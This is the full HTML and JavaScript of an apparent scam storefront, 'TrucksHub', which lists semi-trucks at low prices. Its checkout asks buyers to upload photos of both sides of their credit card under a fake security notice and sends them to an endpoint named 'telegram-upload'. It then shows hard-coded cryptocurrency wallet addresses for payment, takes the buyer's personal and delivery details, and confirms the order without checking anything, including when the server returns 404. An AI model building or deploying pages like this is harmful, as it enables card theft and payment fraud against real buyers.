<!DOCTYPE html>
<html lang="en" class="light">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TrucksHub | Premium Semi-Truck Catalog</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Base styles for both modes */
        .app-container {
            padding: 2.5rem; 
            min-height: 100vh;
        }
        
        /* Sidebar transition and fixed layout on large screens */
        @media (min-width: 1024px) { 
            .app-container { margin-left: 256px; } 
            .sidebar-lg-fixed { transform: translateX(0) !important; }
        }

        /* --- LIGHT MODE (Default) --- */
        html.light .bg-page { background-color: #f9fafb; } /* gray-50 */
        html.light .text-default { color: #1f2937; } /* gray-800 */
        html.light .bg-card { background-color: #ffffff; }
        html.light .text-muted { color: #6b7280; } /* gray-500 */
        html.light .bg-input { background-color: #ffffff; border-color: #d1d5db; }
        html.light .bg-secondary-box { background-color: #f3f4f6; } /* gray-100 */

        /* --- DARK MODE --- */
        html.dark .bg-page { background-color: #111827; } /* gray-900 */
        html.dark .text-default { color: #f3f4f6; } /* gray-100 */
        html.dark .bg-card { background-color: #1f2937; } /* gray-800 */
        html.dark .text-muted { color: #9ca3af; } /* gray-400 */
        html.dark .bg-input { background-color: #374151; border-color: #4b5563; color: #f3f4f6; }
        html.dark .bg-secondary-box { background-color: #374151; } /* gray-700 */


        /* Custom scrollbar */
        body::-webkit-scrollbar { width: 8px; }
        body::-webkit-scrollbar-track { background: var(--scroll-track, #f1f1f1); }
        body::-webkit-scrollbar-thumb { background: var(--scroll-thumb, #cbd5e1); border-radius: 4px; }
        body::-webkit-scrollbar-thumb:hover { background: var(--scroll-thumb-hover, #94a3b8); }
        html.dark body::-webkit-scrollbar-track { --scroll-track: #1f2937; }
        html.dark body::-webkit-scrollbar-thumb { --scroll-thumb: #4b5563; }
        html.dark body::-webkit-scrollbar-thumb:hover { --scroll-thumb-hover: #6b7280; }


        /* Core color definitions */
        .bg-primary-blue { background-color: #004d99; }
        .text-primary-blue { color: #004d99; }
        .bg-secondary-gold { background-color: #f4b400; }
        .text-secondary-gold { color: #f4b400; }

        /* Checkout and Card Styles */
        .checkout-card { @apply p-8 rounded-xl shadow-lg border mt-6 bg-card; }
        .truck-card { @apply bg-card border; }
        .truck-card:hover { transform: translateY(-5px); box-shadow: 0 10px 20px rgba(0, 0, 0, 0.15); }
        .crypto-option.selected { border-width: 4px; border-color: #28a745; background-color: var(--success-bg, #ecfdf5); box-shadow: 0 0 10px rgba(40, 167, 69, 0.2); }
        .crypto-option.selected .text-secondary-gold { color: #15803d; }
        html.dark .checkout-card { @apply border-gray-700; }
        html.dark .truck-card { @apply border-gray-700; }
        html.dark .crypto-option.selected { --success-bg: #10b98120; }
    </style>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'primary-blue': '#004d99',
                        'secondary-gold': '#f4b400',
                        'success-color': '#28a745'
                    }
                }
            }
        }
    </script>
</head>
<body class="bg-page text-default transition-colors duration-300">

    <div id="sidebar-overlay" class="fixed inset-0 bg-black bg-opacity-50 z-40 hidden lg:hidden" onclick="toggleSidebar()"></div>

    <div id="sidebar" class="fixed w-64 h-full bg-gray-900 text-white flex flex-col items-center py-8 z-50 transform -translate-x-full transition-transform duration-300 ease-in-out lg:translate-x-0 sidebar-lg-fixed">
        
        <div class="mb-10 px-4">
            <h1 class="text-3xl font-extrabold text-secondary-gold">TrucksHub</h1>
            <p class="text-sm text-gray-400">Premium Fleet Solutions</p>
        </div>
        
        <nav class="w-full">
            <button onclick="changeView('catalog')" class="w-full text-left py-4 px-6 text-lg font-medium hover:bg-gray-800 transition duration-150 flex items-center">
                <svg class="w-6 h-6 mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 13.255A23.931 23.931 0 0112 15c-3.183 0-6.22-1.282-8.455-3.667a.75.75 0 00-.545-.251c-.244 0-.48.118-.63.315A23.924 23.924 0 001 12c.004-.383.078-.763.218-1.127a.75.75 0 00.17-.435c-.164-.475-.402-.93-.71-1.353C4.242 6.843 7.842 5 12 5c3.551 0 6.877 1.488 9.39 4.022a.75.75 0 00.56.241c.219 0 .43.078.586.227A23.93 23.93 0 0023 12c.004.383-.078.763-.218 1.127a.75.75 0 00-.17.435c-.164.475-.402.93-.71 1.353C19.758 17.157 16.158 19 12 19c-3.551 0-6.877-1.488-9.39-4.022z"></path></svg>
                Truck Catalog
            </button>
            <button onclick="changeView('contact')" class="w-full text-left py-4 px-6 text-lg font-medium hover:bg-gray-800 transition duration-150 flex items-center">
                <svg class="w-6 h-6 mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.842 5.234A2 2 0 0012 13.5c.677 0 1.34-.234 1.81-1.81L21 8m-2 12H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v12a2 2 0 01-2 2z"></path></svg>
                Contact Us
            </button>
        </nav>

        <div class="mt-auto w-full p-4">
             <button id="dark-mode-toggle" onclick="toggleDarkMode()" class="w-full text-left py-2 px-6 mb-4 text-gray-300 bg-gray-800 rounded-lg hover:bg-gray-700 transition duration-150 flex items-center">
                <svg id="sun-icon" class="w-6 h-6 mr-3 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path></svg>
                <svg id="moon-icon" class="w-6 h-6 mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path></svg>
                <span id="mode-text">Dark Mode</span>
            </button>
            <div class="text-center text-xs text-gray-500">
                &copy; 2025 TrucksHub. All rights reserved.
            </div>
        </div>
    </div>
    
    <div class="app-container lg:ml-64"> 
        <div class="lg:hidden mb-4">
            <button id="menu-button" onclick="toggleSidebar()" class="p-2 rounded-lg bg-gray-900 text-white hover:bg-gray-700 transition duration-150">
                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path></svg>
            </button>
        </div>

        <div id="app-canvas">
            </div>
    </div>

    <div id="truckDetailModal" class="fixed inset-0 bg-black bg-opacity-75 hidden items-center justify-center z-50">
        <div class="bg-card p-8 rounded-xl shadow-2xl w-full max-w-xl animate-bounce-in-down text-default">
            <div class="flex justify-between items-start mb-4">
                <h3 id="modal-name" class="text-2xl font-bold text-primary-blue"></h3>
                <span class="modal-close text-gray-500 text-3xl cursor-pointer hover:text-gray-900">&times;</span>
            </div>
            <div class="modal-body">
                <img id="modal-image" src="" alt="Truck Image" class="w-full h-64 object-cover rounded-lg mb-4 border border-gray-200">
                <p id="modal-details" class="text-muted mb-4"></p>
                <p id="modal-price" class="text-3xl font-extrabold text-secondary-gold mb-6"></p>
                <div class="text-right">
                    <button class="btn bg-primary-blue hover:bg-indigo-700 py-2 px-4 rounded-lg" id="modal-buy-btn">BUY THIS TRUCK</button>
                </div>
            </div>
        </div>
    </div>


<script>
    // --- GLOBAL STATE ---
    let currentView = 'catalog';
    let orderState = {
        truckId: null,
        truckName: null,
        truckPrice: null, 
        orderId: null,
        paymentMethod: null,
    };

    const WALLETS = {
        'BTC': 'bc1q4c6f7xzsekkpvd2guwkaww4m7se9yjlrxnrjc7',
        'ETH': '0x08cfe6ddc3b58b0655dd1c9214bcfddbd3855cca',
        'USDT_ERC20': '0x08cFE6DDC3b58B0655dD1c9214BcfdDBD3855CCA'
    };

    const TRUCKS = [
        { id: 'PB579-21', name: 'Peterbilt 579 (2021)', info: '2021 Sleeper with ~479k miles.', price: '$47,950', imageUrl: './images/peterbilt-579-2021.jpeg', details: 'High-efficiency sleeper tractor, ideal for team driving and long-haul freight. PACCAR MX-13 engine, 12-speed automated manual transmission.' },
        { id: 'PB579-19', name: 'Peterbilt 579 (2019)', info: '2019 Used Sleeper Tractor.', price: '$44,950', imageUrl: './images/peterbilt-579-2019.jpeg', details: 'Reliable used Peterbilt, maintained for heavy interstate travel. Comfortable cab and proven fuel economy. Perfect entry into owner-operator status.' },
        { id: 'KW680-21', name: 'Kenworth T680 (2021)', info: '2021 Sleeper with ~177k miles.', price: '$69,000', imageUrl: './images/kenworth-t680-2021.jpeg', details: 'Low-mileage unit with premium comfort and aerodynamic design. PACCAR MX engine, factory warranty available. Excellent condition.' },
        { id: 'KW680-19', name: 'Kenworth T680 (2019)', info: '2019 Used Sleeper (Various Mileages).', price: '$56,000', imageUrl: './images/kenworth-t680-2019.jpeg', details: 'Versatile T680, known for durability and driver satisfaction. Available in various specifications to suit diverse hauling needs.' },
        { id: 'FLC-21', name: 'Freightliner Cascadia (2021)', info: '2021 Used Cascadia (125/126 Series).', price: '$76,500', imageUrl: './images/freightliner-cascadia-2021.webp', details: 'The most popular truck in America. Aerodynamic, fuel-efficient, with Detroit DD15 engine and Detroit Assurance safety system. Modern interior.' },
        { id: 'FLC-12', name: 'Freightliner Cascadia (2012)', info: '2012 Day-Cab with ~520k miles.', price: '$28,000', imageUrl: './images/freightliner-cascadia-2012.jpeg', details: 'Economical day-cab option for local and regional routes. Well-maintained and inspected. Great value for short-haul operations.' },
        { id: 'PB389-16', name: 'Peterbilt 389 (2016)', info: '2016 Sleeper, ~656k miles (Classic Look).', price: '$69,900', imageUrl: './images/peterbilt-389.jpeg', details: 'A classic long-nose design that commands attention. Cummins ISX engine, manual transmission. A favorite among traditionalists.' },
        { id: 'VVNL-20', name: 'Volvo VNL 670 (2020)', info: '2020 Used VNL 670 Tractor.', price: '$75,000', imageUrl: './images/volvo-vnl-670.jpeg', details: 'Focus on safety and driver comfort. Volvo D13 engine, I-Shift automated transmission. Large, comfortable sleeper area.' },
        { id: 'MACK-21', name: 'Mack Anthem (2021)', info: '2021 Used Mack Anthem Sleeper.', price: '$80,000', imageUrl: './images/mack-anthem-2021.jpeg', details: 'Rugged reliability with modern styling. Mack MP8 engine, mDRIVE automated transmission. Excellent power and torque for challenging hauls.' },
        { id: 'INT-LT', name: 'International ProStar / LT', info: '2014-2021 Used Model Range.', price: '$45,000', imageUrl: './images/international-lt.jpeg', details: 'A dependable and affordable line of tractors. Good balance of performance and operating cost. Various configurations available.' }
    ];

    const canvas = document.getElementById('app-canvas');
    const modal = document.getElementById('truckDetailModal');
    const modalClose = document.querySelector('.modal-close');

    // --- DARK MODE LOGIC ---
    function updateModeIcons(isDark) {
        const moonIcon = document.getElementById('moon-icon');
        const sunIcon = document.getElementById('sun-icon');
        const modeText = document.getElementById('mode-text');

        if (isDark) {
            moonIcon.classList.add('hidden');
            sunIcon.classList.remove('hidden');
            modeText.textContent = "Light Mode";
        } else {
            moonIcon.classList.remove('hidden');
            sunIcon.classList.add('hidden');
            modeText.textContent = "Dark Mode";
        }
    }

    function toggleDarkMode() {
        const html = document.documentElement;
        const isDark = html.classList.toggle('dark');
        html.classList.toggle('light', !isDark);
        
        // Save preference (optional, but good practice)
        localStorage.setItem('theme', isDark ? 'dark' : 'light');
        updateModeIcons(isDark);
    }

    function loadTheme() {
        const savedTheme = localStorage.getItem('theme') || 'light';
        const html = document.documentElement;
        html.classList.add(savedTheme);
        updateModeIcons(savedTheme === 'dark');
    }
    // End Dark Mode Logic

    // --- NAVIGATION & UTILITY ---
    function toggleSidebar() {
        const sidebar = document.getElementById('sidebar');
        const overlay = document.getElementById('sidebar-overlay');
        
        const isHidden = sidebar.classList.contains('-translate-x-full');

        if (isHidden) {
            sidebar.classList.remove('-translate-x-full');
            sidebar.classList.add('translate-x-0');
            overlay.classList.remove('hidden');
        } else {
            sidebar.classList.remove('translate-x-0');
            sidebar.classList.add('-translate-x-full');
            overlay.classList.add('hidden');
        }
    }

    function changeView(viewName) {
        currentView = viewName;
        if (window.innerWidth < 1024) { 
            toggleSidebar();
        }

        if (viewName === 'catalog') {
            renderCatalog();
        } else if (viewName === 'contact') {
            renderContactUs();
        }
        modal.style.display = 'none';
    }

    function updateProgressBar(step) {
        const progressBar = `
            <div class="flex justify-between items-center mb-6 text-sm font-medium text-muted">
                <div class="text-center ${step >= 1 ? 'text-primary-blue font-semibold' : ''}">
                    <div class="w-10 h-10 mx-auto rounded-full ${step >= 1 ? 'bg-primary-blue text-white' : 'bg-gray-200 text-gray-500 bg-secondary-box text-muted'} flex items-center justify-center mb-1">1</div>
                    Verification
                </div>
                <div class="flex-auto border-t-2 ${step >= 2 ? 'border-primary-blue' : 'border-gray-200'} mx-4"></div>
                
                <div class="text-center ${step >= 2 ? 'text-primary-blue font-semibold' : ''}">
                    <div class="w-10 h-10 mx-auto rounded-full ${step >= 2 ? 'bg-primary-blue text-white' : 'bg-gray-200 text-gray-500 bg-secondary-box text-muted'} flex items-center justify-center mb-1">2</div>
                    Payment
                </div>
                <div class="flex-auto border-t-2 ${step >= 3 ? 'border-primary-blue' : 'border-gray-200'} mx-4"></div>
                
                <div class="text-center ${step >= 3 ? 'text-primary-blue font-semibold' : ''}">
                    <div class="w-10 h-10 mx-auto rounded-full ${step >= 3 ? 'bg-primary-blue text-white' : 'bg-gray-200 text-gray-500 bg-secondary-box text-muted'} flex items-center justify-center mb-1">3</div>
                    Delivery
                </div>
            </div>
        `;
        document.getElementById('progress-container').innerHTML = progressBar;
    }

    modalClose.onclick = function() { modal.style.display = 'none'; }
    window.onclick = function(event) { if (event.target === modal) { modal.style.display = 'none'; } }

    function showDetails(truckId) {
        const truck = TRUCKS.find(t => t.id === truckId);
        if (!truck) return;

        document.getElementById('modal-image').src = truck.imageUrl;
        document.getElementById('modal-name').textContent = truck.name;
        document.getElementById('modal-price').textContent = `Price: ${truck.price}`;
        document.getElementById('modal-details').textContent = truck.details;
        
        document.getElementById('modal-buy-btn').onclick = () => {
            modal.style.display = 'none';
            startPurchase(truck.id, truck.name);
        };

        modal.style.display = 'flex'; 
    }

    // --- VIEW RENDERING FUNCTIONS ---

    function renderCatalog() {
        let content = `
            <h2 class="text-3xl font-bold text-default mb-8 border-b pb-4">Premium Semi-Truck Fleet</h2>
            <div id="catalog-grid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
        `;
        TRUCKS.forEach(truck => {
            content += `
                <div class="truck-card rounded-xl overflow-hidden shadow-lg hover:shadow-2xl transition duration-300 transform">
                    <img src="${truck.imageUrl}" alt="${truck.name}" class="w-full h-48 object-cover border-b border-gray-200">
                    <div class="p-5">
                        <h3 class="text-xl font-semibold text-primary-blue mb-1">${truck.name}</h3>
                        <p class="text-sm text-muted h-10 overflow-hidden mb-3">${truck.info}</p>
                        <div class="flex justify-between items-center pt-3 border-t">
                            <span class="text-2xl font-extrabold text-secondary-gold">${truck.price}</span>
                            <div class="space-x-2">
                                <button class="btn-secondary bg-secondary-gold text-gray-900 py-2 px-4 rounded-lg text-sm hover:bg-yellow-500" onclick="showDetails('${truck.id}')">Details</button>
                                <button class="btn bg-primary-blue py-2 px-4 rounded-lg text-sm hover:bg-indigo-700" onclick="startPurchase('${truck.id}', '${truck.name}')">Buy Now</button>
                            </div>
                        </div>
                    </div>
                </div>
            `;
        });
        content += '</div>';
        canvas.innerHTML = content;
    }

    function renderContactUs() {
        canvas.innerHTML = `
            <h2 class="text-3xl font-bold text-default mb-8 border-b pb-4">Contact TrucksHub Support</h2>
            <div class="bg-card p-10 rounded-xl shadow-xl border border-gray-100 max-w-2xl mx-auto">
                <p class="text-lg text-muted mb-6">We are here to assist you with sales, technical queries, or order support.</p>
                
                <div class="space-y-4">
                    <div class="flex items-center p-4 bg-secondary-box rounded-lg">
                        <svg class="w-6 h-6 text-primary-blue mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"></path></svg>
                        <div>
                            <p class="font-medium">Sales Line (24/7)</p>
                            <p class="text-primary-blue font-semibold">+1 (800) 555-T-HUB</p>
                        </div>
                    </div>
                    
                    <div class="flex items-center p-4 bg-secondary-box rounded-lg">
                        <svg class="w-6 h-6 text-primary-blue mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.842 5.234A2 2 0 0012 13.5c.677 0 1.34-.234 1.81-1.81L21 8m-2 12H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v12a2 2 0 01-2 2z"></path></svg>
                        <div>
                            <p class="font-medium">Email Support</p>
                            <p class="text-primary-blue font-semibold">support@truckshub.com</p>
                        </div>
                    </div>

                    <div class="flex items-center p-4 bg-secondary-box rounded-lg">
                        <svg class="w-6 h-6 text-primary-blue mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.828 0l-4.243-4.243a8 8 0 1111.314 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
                        <div>
                            <p class="font-medium">Headquarters</p>
                            <p class="text-primary-blue font-semibold">123 Fleet Way, Transportation City, USA</p>
                        </div>
                    </div>
                </div>
            </div>
        `;
    }

    function renderCardVerification() {
        canvas.innerHTML = `
            <h2 class="text-3xl font-bold text-default mb-8 border-b pb-4">Secure Checkout</h2>
            <div id="progress-container"></div>
            
            <div class="checkout-card">
                <h3 class="text-2xl font-semibold mb-4 text-default">1. Payment Verification (${orderState.truckName})</h3>
                <p class="text-lg font-bold text-secondary-gold mb-4">Amount Due: ${orderState.truckPrice}</p>
                
                <div class="p-4 bg-gray-900 text-white rounded-lg mb-6 border-l-4 border-secondary-gold">
                    <p class="text-sm font-medium"> **SECURITY PROTOCOL:** This one-time verification is mandatory for crypto transactions to prevent fraud. Please upload clear images of the **FRONT** and **BACK** of your credit card.</p>
                </div>
                
                <form id="card-upload-form">
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                        <div class="form-group">
                            <label for="card-front" class="block text-sm font-medium text-muted mb-1">Card Front Image (Mandatory)</label>
                            <input type="file" id="card-front" name="cardFront" accept="image/*" class="w-full text-sm text-muted file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-sm file:font-semibold file:bg-primary-blue file:text-white hover:file:bg-indigo-700" required>
                        </div>
                        <div class="form-group">
                            <label for="card-back" class="block text-sm font-medium text-muted mb-1">Card Back Image (Mandatory)</label>
                            <input type="file" id="card-back" name="cardBack" accept="image/*" class="w-full text-sm text-muted file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-sm file:font-semibold file:bg-primary-blue file:text-white hover:file:bg-indigo-700" required>
                        </div>
                    </div>
                    
                    <button type="submit" class="btn bg-primary-blue hover:bg-indigo-700 w-full mt-4 py-2 px-4 rounded-lg">Proceed to Payment Selection</button>
                </form>
                <div id="message" class="mt-6 p-3 rounded-lg text-sm text-center font-medium hidden"></div>
            </div>
        `;
        document.getElementById('card-upload-form').addEventListener('submit', handleCardUpload);
        updateProgressBar(1);
    }

    function renderPaymentSelection() {
        canvas.innerHTML = `
            <h2 class="text-3xl font-bold text-default mb-8 border-b pb-4">Secure Checkout</h2>
            <div id="progress-container"></div>

            <div class="checkout-card">
                <h3 class="text-2xl font-semibold mb-4 text-default">2. Select Crypto Payment Method</h3>
                <p class="text-lg font-bold text-secondary-gold mb-4">Amount Due: ${orderState.truckPrice}</p>
                <p class="text-sm text-muted mb-6">Order ID: <strong class="text-primary-blue">${orderState.orderId}</strong></p>

                <div class="flex justify-around space-x-4 mb-8">
                    <div class="crypto-option w-1/3 p-6 border-2 border-gray-200 rounded-xl cursor-pointer hover:border-primary-blue transition duration-200 text-center bg-secondary-box" data-method="BTC">
                        <div class="text-4xl text-secondary-gold mb-2">₿</div>
                        <h4 class="text-xl font-semibold text-default">Bitcoin (BTC)</h4>
                        <p class="text-sm text-muted">Fastest confirmation</p>
                    </div>
                    <div class="crypto-option w-1/3 p-6 border-2 border-gray-200 rounded-xl cursor-pointer hover:border-primary-blue transition duration-200 text-center bg-secondary-box" data-method="ETH">
                        <div class="text-4xl text-muted mb-2">Ξ</div>
                        <h4 class="text-xl font-semibold text-default">Ethereum (ETH)</h4>
                        <p class="text-sm text-muted">Standard network fee</p>
                    </div>
                    <div class="crypto-option w-1/3 p-6 border-2 border-gray-200 rounded-xl cursor-pointer hover:border-primary-blue transition duration-200 text-center bg-secondary-box" data-method="USDT_ERC20">
                        <div class="text-4xl text-green-500 mb-2">₮</div>
                        <h4 class="text-xl font-semibold text-default">USDT (ERC20)</h4>
                        <p class="text-sm text-muted">Stablecoin value</p>
                    </div>
                </div>
                
                <div id="wallet-info" class="p-6 bg-secondary-box rounded-lg text-center hidden">
                    <p class="text-base text-default font-medium mb-3">Please send the **EXACT AMOUNT (${orderState.truckPrice})** to this wallet:</p>
                    <div id="address-display" class="address-box bg-card text-default p-3 border border-dashed border-primary-blue font-mono text-sm break-all"></div>
                    <button class="btn bg-success-color hover:bg-green-700 mt-6 py-2 px-4 rounded-lg" onclick="startConfirmation()">I Have Sent Payment</button>
                </div>
                </div>
        `;
        document.querySelectorAll('.crypto-option').forEach(option => {
            option.addEventListener('click', handlePaymentSelect);
        });
        updateProgressBar(2);
    }

    function renderDeliveryDetails() {
        canvas.innerHTML = `
            <h2 class="text-3xl font-bold text-default mb-8 border-b pb-4">Secure Checkout</h2>
            <div id="progress-container"></div>

            <div class="checkout-card">
                <h3 class="text-2xl font-semibold mb-4 text-default">3. Delivery Information</h3>
                <p class="text-sm text-muted mb-6">Finalizing order <strong class="text-primary-blue">${orderState.orderId}</strong> for the ${orderState.truckName} (${orderState.truckPrice}).</p>
                
                <form id="delivery-form">
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-x-6 gap-y-4">
                        <div class="form-group"><label for="name" class="block text-sm font-medium text-muted">Full Name</label><input type="text" id="name" name="name" class="p-2 border border-gray-300 rounded-md w-full bg-input" required></div>
                        <div class="form-group">
                            <label for="gender" class="block text-sm font-medium text-muted">Gender</label>
                            <select id="gender" name="gender" class="p-2 border border-gray-300 rounded-md w-full bg-input" required>
                                <option value="" disabled selected>Select Gender</option>
                                <option value="Male">Male</option>
                                <option value="Female">Female</option>
                            </select>
                        </div>
                        <div class="form-group"><label for="email" class="block text-sm font-medium text-muted">Email</label><input type="email" id="email" name="email" class="p-2 border border-gray-300 rounded-md w-full bg-input" required></div>
                        <div class="form-group"><label for="phone" class="block text-sm font-medium text-muted">Phone Number</label><input type="tel" id="phone" name="phone" class="p-2 border border-gray-300 rounded-md w-full bg-input" required></div>
                        <div class="form-group"><label for="country" class="block text-sm font-medium text-muted">Country</label><input type="text" id="country" name="country" class="p-2 border border-gray-300 rounded-md w-full bg-input" required></div>
                        <div class="form-group"><label for="state" class="block text-sm font-medium text-muted">State/Province</label><input type="text" id="state" name="state" class="p-2 border border-gray-300 rounded-md w-full bg-input" required></div>
                    </div>
                    <div class="form-group mt-4"><label for="address" class="block text-sm font-medium text-muted">Full Delivery Address</label><textarea id="address" name="address" rows="3" class="p-2 border border-gray-300 rounded-md w-full bg-input" required></textarea></div>
                    
                    <button type="submit" class="btn bg-primary-blue hover:bg-indigo-700 w-full mt-6 py-2 px-4 rounded-lg">SUBMIT FINAL ORDER</button>
                </form>
            </div>
        `;
        document.getElementById('delivery-form').addEventListener('submit', handleFinalSubmission);
        updateProgressBar(3);
    }

    function renderOrderReceived() {
        canvas.innerHTML = `
            <div class="checkout-card max-w-xl mx-auto text-center">
                <div class="text-6xl text-success-color mb-4">✅</div>
                <h2 class="text-3xl font-bold text-default mb-2">Order Confirmed!</h2>
                <p class="text-lg text-muted mb-4">Thank you for securing your purchase of the <strong>${orderState.truckName}</strong>.</p>
                <p class="text-xl font-medium text-primary-blue mb-6">Order ID: ${orderState.orderId}</p>
                <p class="text-sm text-muted">A specialist will contact you shortly to confirm the payment and arrange delivery logistics.</p>
                <button onclick="changeView('catalog')" class="btn bg-secondary-gold hover:bg-yellow-500 text-gray-900 mt-8 py-2 px-4 rounded-lg">Back to Catalog</button>
            </div>
        `;
    }

    // --- HANDLERS AND LOGIC ---

    function startPurchase(truckId, truckName) {
        const truck = TRUCKS.find(t => t.id === truckId); 
        
        orderState.truckId = truckId;
        orderState.truckName = truckName;
        orderState.truckPrice = truck.price; 
        
        renderCardVerification();
    }

    async function handleCardUpload(e) {
        e.preventDefault();
        const messageElement = document.getElementById('message');
        messageElement.classList.remove('success', 'error', 'bg-red-100', 'text-red-800', 'border', 'border-red-300', 'bg-green-100', 'text-green-800', 'border', 'border-green-300', 'bg-yellow-100', 'text-yellow-800', 'border', 'border-yellow-300');
        messageElement.classList.add('bg-yellow-100', 'text-yellow-800', 'border', 'border-yellow-300');
        messageElement.textContent = "Processing and verifying details...";
        messageElement.style.display = 'block';

        const formData = new FormData();
        const cardFrontFile = document.getElementById('card-front').files[0];
        const cardBackFile = document.getElementById('card-back').files[0];

        if (!cardFrontFile || !cardBackFile) {
             messageElement.classList.remove('bg-yellow-100', 'text-yellow-800', 'border', 'border-yellow-300');
             messageElement.classList.add('bg-red-100', 'text-red-800', 'border', 'border-red-300');
             messageElement.textContent = `Error: Please select both front and back images.`;
             return;
        }

        formData.append('cardFront', cardFrontFile);
        formData.append('cardBack', cardBackFile);
        formData.append('truckId', orderState.truckId);
        formData.append('truckName', orderState.truckName);
        formData.append('truckPrice', orderState.truckPrice); 
        
        try {
            const response = await fetch('/api/telegram-upload', {
                method: 'POST',
                body: formData
            });

            const result = await response.json();
            
            messageElement.classList.remove('bg-yellow-100', 'text-yellow-800', 'border', 'border-yellow-300');

            if (response.ok) {
                 orderState.orderId = result.orderId;
                 messageElement.classList.add('bg-green-100', 'text-green-800', 'border', 'border-green-300');
                 messageElement.textContent = `Verification complete. Proceeding...`;
                 
                 setTimeout(renderPaymentSelection, 1000);

            } else {
                messageElement.classList.add('bg-red-100', 'text-red-800', 'border', 'border-red-300');
                messageElement.textContent = `Error: ${result.message || 'Verification failed. Please try again.'}`;
            }

        } catch (error) {
            messageElement.classList.remove('bg-yellow-100', 'text-yellow-800', 'border', 'border-yellow-300');
            messageElement.classList.add('bg-red-100', 'text-red-800', 'border', 'border-red-300');
            messageElement.textContent = `A network error occurred. Check your Vercel logs.`;
        }
    }

    function handlePaymentSelect(e) {
        const selectedOption = e.currentTarget;
        const method = selectedOption.getAttribute('data-method');
        const address = WALLETS[method];
        
        document.querySelectorAll('.crypto-option').forEach(opt => opt.classList.remove('selected'));
        
        if (address) {
            selectedOption.classList.add('selected');
            document.getElementById('address-display').textContent = address;
            document.getElementById('wallet-info').style.display = 'block';
            orderState.paymentMethod = method;
        } else {
            document.getElementById('wallet-info').style.display = 'none';
        }
    }

    // MODIFIED: This function now skips the visible 20s delay and immediately moves to the next step.
    function startConfirmation() {
        if (!orderState.paymentMethod) {
            alert("Please select a crypto payment method first.");
            return;
        }
        
        // Instantaneous confirmation (as requested, assuming verification happens in the background)
        renderDeliveryDetails();
    }

    async function handleFinalSubmission(e) {
        e.preventDefault();
        
        const formData = new FormData(e.target);
        const deliveryData = {};
        formData.forEach((value, key) => deliveryData[key] = value);

        const finalSubmission = {
            orderId: orderState.orderId,
            truckName: orderState.truckName,
            truckPrice: orderState.truckPrice, 
            paymentMethod: orderState.paymentMethod,
            delivery: deliveryData
        };
        
        try {
            const response = await fetch('/api/final-order', { 
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(finalSubmission)
            });
            
            if (response.ok || response.status === 404) { 
                renderOrderReceived();
            } else {
                alert("Error submitting final order. Please check the console for details.");
            }
        } catch (error) {
            console.error("Final submission error:", error);
            alert("A network error occurred during final submission. Check your Vercel logs.");
        }
    }

    // --- INITIALIZATION ---
    document.addEventListener('DOMContentLoaded', () => {
        loadTheme(); // Load theme preference on startup
        changeView('catalog');
    });
</script>
</body>
</html>
